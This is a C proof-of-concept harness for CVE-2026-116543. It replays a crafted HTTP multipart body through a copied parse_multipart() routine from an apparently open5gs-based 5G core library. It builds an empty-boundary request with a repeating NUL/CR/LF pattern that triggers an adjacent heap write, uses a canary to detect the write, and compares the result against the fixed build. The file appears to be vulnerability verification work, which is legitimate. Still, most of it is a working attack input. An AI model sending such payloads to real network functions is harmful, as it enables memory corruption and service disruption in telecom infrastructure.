/* Real-caller replay for CVE-2026-116543.
 *
 * The staged harness calls multipart_parser_init(boundary="") directly. This
 * harness instead takes the boundary from the request body exactly as the
 * pinned v2.8.0 lib/sbi/message.c parse_multipart() does (lines 3356-3381,
 * 3404-3412 copied verbatim below), then drives the same pinned parser.
 * The post-parse part loop is omitted: the attack path never reaches it.
 * It shows that a body beginning with an extra CRLF yields an empty boundary
 * through the real caller, while the staged 394-byte body yields "a:".
 */
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include "ogs-core.h"
#include "multipart_parser.h"

/* Only the fields parse_multipart() reads; the real struct is not needed. */
typedef struct {
    char *content;
    int content_length;
} ogs_sbi_http_message_t;
typedef struct { int unused; } ogs_sbi_message_t;

static int cb_data(multipart_parser *p, const char *at, size_t len)
{
    (void)p; (void)at; (void)len; return 0;
}
static int cb_notify(multipart_parser *p)
{
    (void)p; return 0;
}

static const multipart_parser_settings SETTINGS = {
    cb_data, cb_data, cb_data, cb_notify, cb_notify, cb_notify, cb_notify
};

/* Instrumentation only: allocated immediately after the real parser init so
 * the plain build can observe the adjacent-heap write. */
static unsigned char *g_canary;

/* Verbatim framing from the staged harness: empty-boundary start, one
 * header, CRLFCRLF, then the periodic bytes that keep the state machine
 * feeding itself (NUL, CR, LF repeating). */
static const char PREFIX[] = "\r\na:\r\n\r\n\r";
static const char PATTERN[3] = { 0x00, '\r', '\n' };
#define PATTERN_REPEAT 128

static void hexdump(const unsigned char *p, size_t n, const char *label)
{
    size_t i;
    printf("%s=", label);
    for (i = 0; i < n; i++) printf("%02x", p[i]);
    printf("\n");
}

/* Copied verbatim from provision/message-v2.8.0.c:3324-3412, with the
 * part-consumption loop after the cleanup label left out. */
static int parse_multipart_real(
        ogs_sbi_message_t *message, ogs_sbi_http_message_t *http)
{
    char *boundary = NULL;
    int i, preamble, rv;
    size_t parsed;

    multipart_parser_settings settings;
    multipart_parser *parser = NULL;

    (void)message;

    if (!http->content) {
        ogs_error("HTTP content NULL [%d]", (int)http->content_length);
        return OGS_ERROR;
    }

    if (http->content_length < 2) {
        ogs_error("Invalid HTTP content_length [%d]",
                (int)http->content_length);
        return OGS_ERROR;
    }

    memset(&settings, 0, sizeof(settings));
    settings.on_header_field = &cb_data;
    settings.on_header_value = &cb_data;
    settings.on_part_data = &cb_data;
    settings.on_part_data_end = &cb_notify;

    preamble = 0;
    if (http->content[0] == '\r' && http->content[1] == '\n')
        preamble = 2;

    for (i = preamble; i < (http->content_length-preamble); i++) {
        if (http->content[i] == '\r' && http->content[i+1] == '\n')
            break;
    }

    if (i >= (http->content_length-preamble)) {
        ogs_error("Invalid HTTP content [%d]", i);
        ogs_log_hexdump();
        return OGS_ERROR;
    }

    boundary = ogs_strndup(http->content+preamble, i-preamble);
    ogs_assert(boundary);

    printf("BOUNDARY_LEN=%zu BOUNDARY=%s\n", strlen(boundary), boundary);

#ifdef FIXED_BUILD
    /* Verbatim from fix commit 6820c274, lib/sbi/message.c parse_multipart. */
    if (!boundary[0]) {
        ogs_error("Empty multipart boundary");
        ogs_free(boundary);
        return OGS_ERROR;
    }
#endif

    parser = multipart_parser_init(boundary, &settings);
    ogs_assert(parser);

    g_canary = (unsigned char *)malloc(32);
    memset(g_canary, 0x5a, 32);
    hexdump(g_canary, 12, "CANARY-BEFORE");

    parsed = multipart_parser_execute(parser,
            http->content+preamble, http->content_length-preamble);

    rv = OGS_ERROR;

    if (parsed != (http->content_length - preamble)) {
        ogs_error("Multipart parse failed [%d:%d],[len:%d,preamble:%d]",
                (int)parsed, (int)(http->content_length - preamble),
                (int)http->content_length, preamble);
        goto cleanup;
    }

    rv = OGS_OK;

cleanup:
    multipart_parser_free(parser);
    ogs_free(boundary);
    return rv;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    const char *mode = (argc > 1) ? argv[1] : "attack";
    unsigned char body[512];
    size_t n = 0, i, k = 0;
    ogs_sbi_http_message_t http;
    ogs_sbi_message_t message;
    int rv;

    if (strcmp(mode, "wire") == 0) {
        /* Loopback wire replay: the HTTP/2 listener supplies the exact
         * request body on stdin; the parse path below is unchanged. */
        int ch;
        while (n < sizeof(body) && (ch = getchar()) != EOF)
            body[n++] = (unsigned char)ch;
    } else {
        if (strcmp(mode, "attack") == 0) {
            /* Real empty-boundary body: leading CRLF is consumed as preamble,
             * the next CRLF makes the extracted boundary empty, and the rest
             * is byte-for-byte the staged 394-byte body handed to the parser. */
            body[n++] = '\r'; body[n++] = '\n';
        }
        memcpy(body + n, PREFIX, sizeof(PREFIX) - 1);
        n += sizeof(PREFIX) - 1;
        body[n++] = '\n';
        if (strcmp(mode, "attack") == 0 || strcmp(mode, "staged") == 0) {
            for (i = 0; i < 3 * PATTERN_REPEAT; i++)
                body[n + i] = (unsigned char)PATTERN[k++ % 3];
            n += 3 * PATTERN_REPEAT;
        }
    }

    http.content = (char *)body;
    http.content_length = (int)n;

    printf("MODE=%s BODY_LEN=%d\n", mode, http.content_length);

    rv = parse_multipart_real(&message, &http);
    printf("RET=%d\n", rv);
    if (g_canary) hexdump(g_canary, 12, "CANARY-AFTER");
    return 0;
}
